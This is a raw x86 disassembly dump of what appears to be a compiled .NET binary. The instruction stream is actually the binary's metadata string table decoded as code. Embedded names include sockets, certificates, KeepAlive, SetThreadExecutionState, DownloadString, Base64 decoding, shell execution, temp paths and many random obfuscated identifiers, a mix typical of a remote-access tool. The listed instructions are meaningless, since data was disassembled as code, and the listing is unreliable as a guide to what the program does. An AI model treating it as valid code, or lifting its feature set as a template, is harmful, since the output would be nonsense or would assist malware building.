  40845b:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  40845f:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  408463:	6f                   	outsl  %ds:(%esi),(%dx)
  408464:	73 74                	jae    0x4084da
  408466:	4e                   	dec    %esi
  408467:	61                   	popa
  408468:	6d                   	insl   (%dx),%es:(%edi)
  408469:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  40846e:	65 54                	gs push %esp
  408470:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  408477:	5f                   	pop    %edi
  408478:	4c                   	dec    %esp
  408479:	61                   	popa
  40847a:	73 74                	jae    0x4084f0
  40847c:	57                   	push   %edi
  40847d:	72 69                	jb     0x4084e8
  40847f:	74 65                	je     0x4084e6
  408481:	54                   	push   %esp
  408482:	69 6d 65 00 54 6f 55 	imul   $0x556f5400,0x65(%ebp),%ebp
  408489:	6e                   	outsb  %ds:(%esi),(%dx)
  40848a:	69 76 65 72 73 61 6c 	imul   $0x6c617372,0x65(%esi),%esi
  408491:	54                   	push   %esp
  408492:	69 6d 65 00 57 72 69 	imul   $0x69725700,0x65(%ebp),%ebp
  408499:	74 65                	je     0x408500
  40849b:	4c                   	dec    %esp
  40849c:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  4084a3:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  4084a6:	65 00 55 72          	add    %dl,%gs:0x72(%ebp)
  4084aa:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  4084b1:	6d                   	insl   (%dx),%es:(%edi)
  4084b2:	65 54                	gs push %esp
  4084b4:	79 70                	jns    0x408526
  4084b6:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4084ba:	74 5f                	je     0x40851b
  4084bc:	56                   	push   %esi
  4084bd:	61                   	popa
  4084be:	6c                   	insb   (%dx),%es:(%edi)
  4084bf:	75 65                	jne    0x408526
  4084c1:	54                   	push   %esp
  4084c2:	79 70                	jns    0x408534
  4084c4:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  4084c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4084c9:	74 6f                	je     0x40853a
  4084cb:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  4084ce:	54                   	push   %esp
  4084cf:	79 70                	jns    0x408541
  4084d1:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  4084d5:	74 54                	je     0x40852b
  4084d7:	79 70                	jns    0x408549
  4084d9:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  4084dd:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4084e0:	74 54                	je     0x408536
  4084e2:	79 70                	jns    0x408554
  4084e4:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  4084e8:	6c                   	insb   (%dx),%es:(%edi)
  4084e9:	65 53                	gs push %ebx
  4084eb:	68 61 72 65 00       	push   $0x657261
  4084f0:	53                   	push   %ebx
  4084f1:	79 73                	jns    0x408566
  4084f3:	74 65                	je     0x40855a
  4084f5:	6d                   	insl   (%dx),%es:(%edi)
  4084f6:	2e 43                	cs inc %ebx
  4084f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4084f9:	72 65                	jb     0x408560
  4084fb:	00 43 6c             	add    %al,0x6c(%ebx)
  4084fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4084ff:	73 65                	jae    0x408566
  408501:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  408505:	70 6f                	jo     0x408576
  408507:	73 65                	jae    0x40856e
  408509:	00 50 61             	add    %dl,0x61(%eax)
  40850c:	72 73                	jb     0x408581
  40850e:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  408512:	72 52                	jb     0x408566
  408514:	65 76 65             	gs jbe 0x40857c
  408517:	72 73                	jb     0x40858c
  408519:	65 00 58 35          	add    %bl,%gs:0x35(%eax)
  40851d:	30 39                	xor    %bh,(%ecx)
  40851f:	43                   	inc    %ebx
  408520:	65 72 74             	gs jb  0x408597
  408523:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  40852a:	00 43 72             	add    %al,0x72(%ebx)
  40852d:	65 61                	gs popa
  40852f:	74 65                	je     0x408596
  408531:	00 53 65             	add    %dl,0x65(%ebx)
  408534:	74 54                	je     0x40858a
  408536:	68 72 65 61 64       	push   $0x64616572
  40853b:	45                   	inc    %ebp
  40853c:	78 65                	js     0x4085a3
  40853e:	63 75 74             	arpl   %esi,0x74(%ebp)
  408541:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  408548:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  40854d:	65 74 65             	gs je  0x4085b5
  408550:	00 43 61             	add    %al,0x61(%ebx)
  408553:	6c                   	insb   (%dx),%es:(%edi)
  408554:	6c                   	insb   (%dx),%es:(%edi)
  408555:	53                   	push   %ebx
  408556:	69 74 65 00 57 72 69 	imul   $0x74697257,0x0(%ebp,%eiz,2),%esi
  40855d:	74 
  40855e:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408562:	6d                   	insl   (%dx),%es:(%edi)
  408563:	70 69                	jo     0x4085ce
  408565:	6c                   	insb   (%dx),%es:(%edi)
  408566:	65 72 47             	gs jb  0x4085b0
  408569:	65 6e                	outsb  %gs:(%esi),(%dx)
  40856b:	65 72 61             	gs jb  0x4085cf
  40856e:	74 65                	je     0x4085d5
  408570:	64 41                	fs inc %ecx
  408572:	74 74                	je     0x4085e8
  408574:	72 69                	jb     0x4085df
  408576:	62 75 74             	bound  %esi,0x74(%ebp)
  408579:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  40857e:	75 67                	jne    0x4085e7
  408580:	67 61                	addr16 popa
  408582:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  408586:	74 74                	je     0x4085fc
  408588:	72 69                	jb     0x4085f3
  40858a:	62 75 74             	bound  %esi,0x74(%ebp)
  40858d:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408591:	6d                   	insl   (%dx),%es:(%edi)
  408592:	56                   	push   %esi
  408593:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  40859a:	74 74                	je     0x408610
  40859c:	72 69                	jb     0x408607
  40859e:	62 75 74             	bound  %esi,0x74(%ebp)
  4085a1:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4085a5:	73 65                	jae    0x40860c
  4085a7:	6d                   	insl   (%dx),%es:(%edi)
  4085a8:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  4085ac:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  4085b3:	72 
  4085b4:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  4085bb:	73 73                	jae    0x408630
  4085bd:	65 6d                	gs insl (%dx),%es:(%edi)
  4085bf:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  4085c3:	72 61                	jb     0x408626
  4085c5:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  4085c8:	61                   	popa
  4085c9:	72 6b                	jb     0x408636
  4085cb:	41                   	inc    %ecx
  4085cc:	74 74                	je     0x408642
  4085ce:	72 69                	jb     0x408639
  4085d0:	62 75 74             	bound  %esi,0x74(%ebp)
  4085d3:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  4085d8:	67 65 74 46          	addr16 gs je 0x408622
  4085dc:	72 61                	jb     0x40863f
  4085de:	6d                   	insl   (%dx),%es:(%edi)
  4085df:	65 77 6f             	gs ja  0x408651
  4085e2:	72 6b                	jb     0x40864f
  4085e4:	41                   	inc    %ecx
  4085e5:	74 74                	je     0x40865b
  4085e7:	72 69                	jb     0x408652
  4085e9:	62 75 74             	bound  %esi,0x74(%ebp)
  4085ec:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4085f0:	73 65                	jae    0x408657
  4085f2:	6d                   	insl   (%dx),%es:(%edi)
  4085f3:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  4085f7:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  4085fe:	69 
  4085ff:	6f                   	outsl  %ds:(%esi),(%dx)
  408600:	6e                   	outsb  %ds:(%esi),(%dx)
  408601:	41                   	inc    %ecx
  408602:	74 74                	je     0x408678
  408604:	72 69                	jb     0x40866f
  408606:	62 75 74             	bound  %esi,0x74(%ebp)
  408609:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40860d:	73 65                	jae    0x408674
  40860f:	6d                   	insl   (%dx),%es:(%edi)
  408610:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408614:	6f                   	outsl  %ds:(%esi),(%dx)
  408615:	6e                   	outsb  %ds:(%esi),(%dx)
  408616:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  40861c:	74 69                	je     0x408687
  40861e:	6f                   	outsl  %ds:(%esi),(%dx)
  40861f:	6e                   	outsb  %ds:(%esi),(%dx)
  408620:	41                   	inc    %ecx
  408621:	74 74                	je     0x408697
  408623:	72 69                	jb     0x40868e
  408625:	62 75 74             	bound  %esi,0x74(%ebp)
  408628:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40862c:	73 65                	jae    0x408693
  40862e:	6d                   	insl   (%dx),%es:(%edi)
  40862f:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  408633:	65 73 63             	gs jae 0x408699
  408636:	72 69                	jb     0x4086a1
  408638:	70 74                	jo     0x4086ae
  40863a:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  408641:	69 62 75 74 65 00 44 	imul   $0x44006574,0x75(%edx),%esp
  408648:	65 66 61             	gs popaw
  40864b:	75 6c                	jne    0x4086b9
  40864d:	74 4d                	je     0x40869c
  40864f:	65 6d                	gs insl (%dx),%es:(%edi)
  408651:	62 65 72             	bound  %esp,0x72(%ebp)
  408654:	41                   	inc    %ecx
  408655:	74 74                	je     0x4086cb
  408657:	72 69                	jb     0x4086c2
  408659:	62 75 74             	bound  %esi,0x74(%ebp)
  40865c:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408660:	6d                   	insl   (%dx),%es:(%edi)
  408661:	70 69                	jo     0x4086cc
  408663:	6c                   	insb   (%dx),%es:(%edi)
  408664:	61                   	popa
  408665:	74 69                	je     0x4086d0
  408667:	6f                   	outsl  %ds:(%esi),(%dx)
  408668:	6e                   	outsb  %ds:(%esi),(%dx)
  408669:	52                   	push   %edx
  40866a:	65 6c                	gs insb (%dx),%es:(%edi)
  40866c:	61                   	popa
  40866d:	78 61                	js     0x4086d0
  40866f:	74 69                	je     0x4086da
  408671:	6f                   	outsl  %ds:(%esi),(%dx)
  408672:	6e                   	outsb  %ds:(%esi),(%dx)
  408673:	73 41                	jae    0x4086b6
  408675:	74 74                	je     0x4086eb
  408677:	72 69                	jb     0x4086e2
  408679:	62 75 74             	bound  %esi,0x74(%ebp)
  40867c:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408680:	73 65                	jae    0x4086e7
  408682:	6d                   	insl   (%dx),%es:(%edi)
  408683:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  408687:	72 6f                	jb     0x4086f8
  408689:	64 75 63             	fs jne 0x4086ef
  40868c:	74 41                	je     0x4086cf
  40868e:	74 74                	je     0x408704
  408690:	72 69                	jb     0x4086fb
  408692:	62 75 74             	bound  %esi,0x74(%ebp)
  408695:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408699:	73 65                	jae    0x408700
  40869b:	6d                   	insl   (%dx),%es:(%edi)
  40869c:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4086a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4086a1:	70 79                	jo     0x40871c
  4086a3:	72 69                	jb     0x40870e
  4086a5:	67 68 74 41 74 74    	addr16 push $0x74744174
  4086ab:	72 69                	jb     0x408716
  4086ad:	62 75 74             	bound  %esi,0x74(%ebp)
  4086b0:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4086b4:	73 65                	jae    0x40871b
  4086b6:	6d                   	insl   (%dx),%es:(%edi)
  4086b7:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4086bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4086bc:	6d                   	insl   (%dx),%es:(%edi)
  4086bd:	70 61                	jo     0x408720
  4086bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4086c0:	79 41                	jns    0x408703
  4086c2:	74 74                	je     0x408738
  4086c4:	72 69                	jb     0x40872f
  4086c6:	62 75 74             	bound  %esi,0x74(%ebp)
  4086c9:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4086cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4086ce:	74 69                	je     0x408739
  4086d0:	6d                   	insl   (%dx),%es:(%edi)
  4086d1:	65 43                	gs inc %ebx
  4086d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4086d4:	6d                   	insl   (%dx),%es:(%edi)
  4086d5:	70 61                	jo     0x408738
  4086d7:	74 69                	je     0x408742
  4086d9:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  4086dc:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  4086e3:	69 
  4086e4:	62 75 74             	bound  %esi,0x74(%ebp)
  4086e7:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4086eb:	74 5f                	je     0x40874c
  4086ed:	55                   	push   %ebp
  4086ee:	73 65                	jae    0x408755
  4086f0:	53                   	push   %ebx
  4086f1:	68 65 6c 6c 45       	push   $0x456c6c65
  4086f6:	78 65                	js     0x40875d
  4086f8:	63 75 74             	arpl   %esi,0x74(%ebp)
  4086fb:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  4086ff:	61                   	popa
  408700:	64 42                	fs inc %edx
  408702:	79 74                	jns    0x408778
  408704:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  408708:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  40870f:	00 
  408710:	44                   	inc    %esp
  408711:	65 6c                	gs insb (%dx),%es:(%edi)
  408713:	65 74 65             	gs je  0x40877b
  408716:	56                   	push   %esi
  408717:	61                   	popa
  408718:	6c                   	insb   (%dx),%es:(%edi)
  408719:	75 65                	jne    0x408780
  40871b:	00 47 65             	add    %al,0x65(%edi)
  40871e:	74 56                	je     0x408776
  408720:	61                   	popa
  408721:	6c                   	insb   (%dx),%es:(%edi)
  408722:	75 65                	jne    0x408789
  408724:	00 53 65             	add    %dl,0x65(%ebx)
  408727:	74 56                	je     0x40877f
  408729:	61                   	popa
  40872a:	6c                   	insb   (%dx),%es:(%edi)
  40872b:	75 65                	jne    0x408792
  40872d:	00 67 65             	add    %ah,0x65(%edi)
  408730:	74 5f                	je     0x408791
  408732:	4b                   	dec    %ebx
  408733:	65 65 70 41          	gs gs jo 0x408778
  408737:	6c                   	insb   (%dx),%es:(%edi)
  408738:	69 76 65 00 73 65 74 	imul   $0x74657300,0x65(%esi),%esi
  40873f:	5f                   	pop    %edi
  408740:	4b                   	dec    %ebx
  408741:	65 65 70 41          	gs gs jo 0x408786
  408745:	6c                   	insb   (%dx),%es:(%edi)
  408746:	69 76 65 00 52 65 6d 	imul   $0x6d655200,0x65(%esi),%esi
  40874d:	6f                   	outsl  %ds:(%esi),(%dx)
  40874e:	76 65                	jbe    0x4087b5
  408750:	00 63 4b             	add    %ah,0x4b(%ebx)
  408753:	75 71                	jne    0x4087c6
  408755:	49                   	dec    %ecx
  408756:	63 45 6b             	arpl   %eax,0x6b(%ebp)
  408759:	4a                   	dec    %edx
  40875a:	49                   	dec    %ecx
  40875b:	79 65                	jns    0x4087c2
  40875d:	00 73 65             	add    %dh,0x65(%ebx)
  408760:	74 5f                	je     0x4087c1
  408762:	42                   	inc    %edx
  408763:	6c                   	insb   (%dx),%es:(%edi)
  408764:	6f                   	outsl  %ds:(%esi),(%dx)
  408765:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  408768:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  40876f:	5f                   	pop    %edi
  408770:	54                   	push   %esp
  408771:	6f                   	outsl  %ds:(%esi),(%dx)
  408772:	74 61                	je     0x4087d5
  408774:	6c                   	insb   (%dx),%es:(%edi)
  408775:	53                   	push   %ebx
  408776:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  40877d:	5f                   	pop    %edi
  40877e:	48                   	dec    %eax
  40877f:	65 61                	gs popa
  408781:	64 65 72 53          	fs gs jb 0x4087d8
  408785:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  40878c:	5f                   	pop    %edi
  40878d:	48                   	dec    %eax
  40878e:	65 61                	gs popa
  408790:	64 65 72 53          	fs gs jb 0x4087e7
  408794:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  40879b:	5f                   	pop    %edi
  40879c:	53                   	push   %ebx
  40879d:	65 6e                	outsb  %gs:(%esi),(%dx)
  40879f:	64 42                	fs inc %edx
  4087a1:	75 66                	jne    0x408809
  4087a3:	66 65 72 53          	data16 gs jb 0x4087fa
  4087a7:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  4087ae:	5f                   	pop    %edi
  4087af:	52                   	push   %edx
  4087b0:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  4087b4:	76 65                	jbe    0x40881b
  4087b6:	42                   	inc    %edx
  4087b7:	75 66                	jne    0x40881f
  4087b9:	66 65 72 53          	data16 gs jb 0x408810
  4087bd:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  4087c4:	5f                   	pop    %edi
  4087c5:	4b                   	dec    %ebx
  4087c6:	65 79 53             	gs jns 0x40881c
  4087c9:	69 7a 65 00 6b 5a 65 	imul   $0x655a6b00,0x65(%edx),%edi
  4087d0:	61                   	popa
  4087d1:	53                   	push   %ebx
  4087d2:	6e                   	outsb  %ds:(%esi),(%dx)
  4087d3:	43                   	inc    %ebx
  4087d4:	6b 72 51 74          	imul   $0x74,0x51(%edx),%esi
  4087d8:	43                   	inc    %ebx
  4087d9:	66 00 59 65          	data16 add %bl,0x65(%ecx)
  4087dd:	57                   	push   %edi
  4087de:	79 61                	jns    0x408841
  4087e0:	46                   	inc    %esi
  4087e1:	54                   	push   %esp
  4087e2:	65 43                	gs inc %ebx
  4087e4:	50                   	push   %eax
  4087e5:	61                   	popa
  4087e6:	44                   	inc    %esp
  4087e7:	66 00 61 59          	data16 add %ah,0x59(%ecx)
  4087eb:	59                   	pop    %ecx
  4087ec:	52                   	push   %edx
  4087ed:	4f                   	dec    %edi
  4087ee:	63 49 4b             	arpl   %ecx,0x4b(%ecx)
  4087f1:	6d                   	insl   (%dx),%es:(%edi)
  4087f2:	66 00 45 41          	data16 add %al,0x41(%ebp)
  4087f6:	51                   	push   %ecx
  4087f7:	42                   	inc    %edx
  4087f8:	6d                   	insl   (%dx),%es:(%edi)
  4087f9:	69 56 42 6a 70 42 5a 	imul   $0x5a42706a,0x42(%esi),%edx
  408800:	6f                   	outsl  %ds:(%esi),(%dx)
  408801:	66 00 7a 59          	data16 add %bh,0x59(%edx)
  408805:	68 61 65 45 6a       	push   $0x6a456561
  40880a:	79 4e                	jns    0x40885a
  40880c:	47                   	inc    %edi
  40880d:	55                   	push   %ebp
  40880e:	4b                   	dec    %ebx
  40880f:	50                   	push   %eax
  408810:	71 66                	jno    0x408878
  408812:	00 6b 53             	add    %ch,0x53(%ebx)
  408815:	49                   	dec    %ecx
  408816:	52                   	push   %edx
  408817:	72 6e                	jb     0x408887
  408819:	77 57                	ja     0x408872
  40881b:	76 6c                	jbe    0x408889
  40881d:	6b 7a 66 00          	imul   $0x0,0x66(%edx),%edi
  408821:	67 5a                	addr16 pop %edx
  408823:	58                   	pop    %eax
  408824:	57                   	push   %edi
  408825:	64 56                	fs push %esi
  408827:	55                   	push   %ebp
  408828:	71 47                	jno    0x408871
  40882a:	50                   	push   %eax
  40882b:	50                   	push   %eax
  40882c:	46                   	inc    %esi
  40882d:	4e                   	dec    %esi
  40882e:	67 00 4f 77          	add    %cl,0x77(%bx)
  408832:	6c                   	insb   (%dx),%es:(%edi)
  408833:	58                   	pop    %eax
  408834:	65 59                	gs pop %ecx
  408836:	65 41                	gs inc %ecx
  408838:	68 67 00 43 72       	push   $0x72430067
  40883d:	79 70                	jns    0x4088af
  40883f:	74 6f                	je     0x4088b0
  408841:	43                   	inc    %ebx
  408842:	6f                   	outsl  %ds:(%esi),(%dx)
  408843:	6e                   	outsb  %ds:(%esi),(%dx)
  408844:	66 69 67 00 44 73    	imul   $0x7344,0x0(%edi),%sp
  40884a:	5a                   	pop    %edx
  40884b:	62 6e 53             	bound  %ebp,0x53(%esi)
  40884e:	47                   	inc    %edi
  40884f:	72 63                	jb     0x4088b4
  408851:	62 6b 67             	bound  %ebp,0x67(%ebx)
  408854:	00 67 65             	add    %ah,0x65(%edi)
  408857:	74 5f                	je     0x4088b8
  408859:	50                   	push   %eax
  40885a:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408861:	5f                   	pop    %edi
  408862:	50                   	push   %eax
  408863:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  40886a:	74 65                	je     0x4088d1
  40886c:	6d                   	insl   (%dx),%es:(%edi)
  40886d:	2e 54                	cs push %esp
  40886f:	68 72 65 61 64       	push   $0x64616572
  408874:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  40887b:	5f                   	pop    %edi
  40887c:	50                   	push   %eax
  40887d:	61                   	popa
  40887e:	64 64 69 6e 67 00 61 	fs imul $0x64646100,%fs:0x67(%esi),%ebp
  408885:	64 64 
  408887:	5f                   	pop    %edi
  408888:	53                   	push   %ebx
  408889:	65 73 73             	gs jae 0x4088ff
  40888c:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408893:	6e                   	outsb  %ds:(%esi),(%dx)
  408894:	67 00 55 54          	add    %dl,0x54(%di)
  408898:	46                   	inc    %esi
  408899:	38 45 6e             	cmp    %al,0x6e(%ebp)
  40889c:	63 6f 64             	arpl   %ebp,0x64(%edi)
  40889f:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  4088a6:	74 65                	je     0x40890d
  4088a8:	6d                   	insl   (%dx),%es:(%edi)
  4088a9:	2e 44                	cs inc %esp
  4088ab:	72 61                	jb     0x40890e
  4088ad:	77 69                	ja     0x408918
  4088af:	6e                   	outsb  %ds:(%esi),(%dx)
  4088b0:	67 2e 49             	addr16 cs dec %ecx
  4088b3:	6d                   	insl   (%dx),%es:(%edi)
  4088b4:	61                   	popa
  4088b5:	67 69 6e 67 00 53 79 	imul   $0x73795300,0x67(%bp),%ebp
  4088bc:	73 
  4088bd:	74 65                	je     0x408924
  4088bf:	6d                   	insl   (%dx),%es:(%edi)
  4088c0:	2e 52                	cs push %edx
  4088c2:	75 6e                	jne    0x408932
  4088c4:	74 69                	je     0x40892f
  4088c6:	6d                   	insl   (%dx),%es:(%edi)
  4088c7:	65 2e 56             	gs cs push %esi
  4088ca:	65 72 73             	gs jb  0x408940
  4088cd:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  4088d4:	46                   	inc    %esi
  4088d5:	72 6f                	jb     0x408946
  4088d7:	6d                   	insl   (%dx),%es:(%edi)
  4088d8:	42                   	inc    %edx
  4088d9:	61                   	popa
  4088da:	73 65                	jae    0x408941
  4088dc:	36 34 53             	ss xor $0x53,%al
  4088df:	74 72                	je     0x408953
  4088e1:	69 6e 67 00 54 6f 42 	imul   $0x426f5400,0x67(%esi),%ebp
  4088e8:	61                   	popa
  4088e9:	73 65                	jae    0x408950
  4088eb:	36 34 53             	ss xor $0x53,%al
  4088ee:	74 72                	je     0x408962
  4088f0:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  4088f7:	6e                   	outsb  %ds:(%esi),(%dx)
  4088f8:	6c                   	insb   (%dx),%es:(%edi)
  4088f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4088fa:	61                   	popa
  4088fb:	64 53                	fs push %ebx
  4088fd:	74 72                	je     0x408971
  4088ff:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  408906:	74 72                	je     0x40897a
  408908:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  40890f:	5f                   	pop    %edi
  408910:	41                   	inc    %ecx
  408911:	73 53                	jae    0x408966
  408913:	74 72                	je     0x408987
  408915:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  40891c:	5f                   	pop    %edi
  40891d:	41                   	inc    %ecx
  40891e:	73 53                	jae    0x408973
  408920:	74 72                	je     0x408994
  408922:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  408929:	53                   	push   %ebx
  40892a:	74 72                	je     0x40899e
  40892c:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  408933:	73 74                	jae    0x4089a9
  408935:	72 69                	jb     0x4089a0
  408937:	6e                   	outsb  %ds:(%esi),(%dx)
  408938:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  40893c:	73 74                	jae    0x4089b2
  40893e:	65 6d                	gs insl (%dx),%es:(%edi)
  408940:	2e 44                	cs inc %esp
  408942:	72 61                	jb     0x4089a5
  408944:	77 69                	ja     0x4089af
  408946:	6e                   	outsb  %ds:(%esi),(%dx)
  408947:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  40894b:	74 5f                	je     0x4089ac
  40894d:	45                   	inc    %ebp
  40894e:	72 72                	jb     0x4089c2
  408950:	6f                   	outsl  %ds:(%esi),(%dx)
  408951:	72 44                	jb     0x408997
  408953:	69 61 6c 6f 67 00 73 	imul   $0x7300676f,0x6c(%ecx),%esp
  40895a:	75 6b                	jne    0x4089c7
  40895c:	6a 65                	push   $0x65
  40895e:	77 58                	ja     0x4089b8
  408960:	4e                   	dec    %esi
  408961:	6d                   	insl   (%dx),%es:(%edi)
  408962:	73 67                	jae    0x4089cb
  408964:	00 76 6d             	add    %dh,0x6d(%esi)
  408967:	6a 6c                	push   $0x6c
  408969:	46                   	inc    %esi
  40896a:	71 64                	jno    0x4089d0
  40896c:	55                   	push   %ebp
  40896d:	6a 77                	push   $0x77
  40896f:	67 00 78 5a          	add    %bh,0x5a(%bx,%si)
  408973:	6c                   	insb   (%dx),%es:(%edi)
  408974:	51                   	push   %ecx
  408975:	6b 63 6c 69          	imul   $0x69,0x6c(%ebx),%esp
  408979:	54                   	push   %esp
  40897a:	71 75                	jno    0x4089f1
  40897c:	79 67                	jns    0x4089e5
  40897e:	00 54 41 78          	add    %dl,0x78(%ecx,%eax,2)
  408982:	62 56 7a             	bound  %edx,0x7a(%esi)
  408985:	45                   	inc    %ebp
  408986:	76 45                	jbe    0x4089cd
  408988:	6f                   	outsl  %ds:(%esi),(%dx)
  408989:	5a                   	pop    %edx
  40898a:	68 00 43 6f 6d       	push   $0x6d6f4300
  40898f:	70 75                	jo     0x408a06
  408991:	74 65                	je     0x4089f8
  408993:	48                   	dec    %eax
  408994:	61                   	popa
  408995:	73 68                	jae    0x4089ff
  408997:	00 56 65             	add    %dl,0x65(%esi)
  40899a:	72 69                	jb     0x408a05
  40899c:	66 79 48             	data16 jns 0x4089e7
  40899f:	61                   	popa
  4089a0:	73 68                	jae    0x408a0a
  4089a2:	00 46 6c             	add    %al,0x6c(%esi)
  4089a5:	75 73                	jne    0x408a1a
  4089a7:	68 00 62 4c 44       	push   $0x444c6200
  4089ac:	41                   	inc    %ecx
  4089ad:	69 4a 6d 4d 67 77 44 	imul   $0x4477674d,0x6d(%edx),%ecx
  4089b4:	74 68                	je     0x408a1e
  4089b6:	00 67 65             	add    %ah,0x65(%edi)
  4089b9:	74 5f                	je     0x408a1a
  4089bb:	45                   	inc    %ebp
  4089bc:	78 65                	js     0x408a23
  4089be:	63 75 74             	arpl   %esi,0x74(%ebp)
  4089c1:	61                   	popa
  4089c2:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  4089c6:	61                   	popa
  4089c7:	74 68                	je     0x408a31
  4089c9:	00 47 65             	add    %al,0x65(%edi)
  4089cc:	74 54                	je     0x408a22
  4089ce:	65 6d                	gs insl (%dx),%es:(%edi)
  4089d0:	70 50                	jo     0x408a22
  4089d2:	61                   	popa
  4089d3:	74 68                	je     0x408a3d
  4089d5:	00 67 65             	add    %ah,0x65(%edi)
  4089d8:	74 5f                	je     0x408a39
  4089da:	4c                   	dec    %esp
  4089db:	65 6e                	outsb  %gs:(%esi),(%dx)
  4089dd:	67 74 68             	addr16 je 0x408a48
  4089e0:	00 62 51             	add    %ah,0x51(%edx)
  4089e3:	6c                   	insb   (%dx),%es:(%edi)
  4089e4:	43                   	inc    %ebx
  4089e5:	74 6d                	je     0x408a54
  4089e7:	64 64 56             	fs fs push %esi
  4089ea:	7a 68                	jp     0x408a54
  4089ec:	00 54 4c 59          	add    %dl,0x59(%esp,%ecx,2)
  4089f0:	50                   	push   %eax
  4089f1:	4a                   	dec    %edx
  4089f2:	50                   	push   %eax
  4089f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4089f4:	63 69 7a             	arpl   %ebp,0x7a(%ecx)
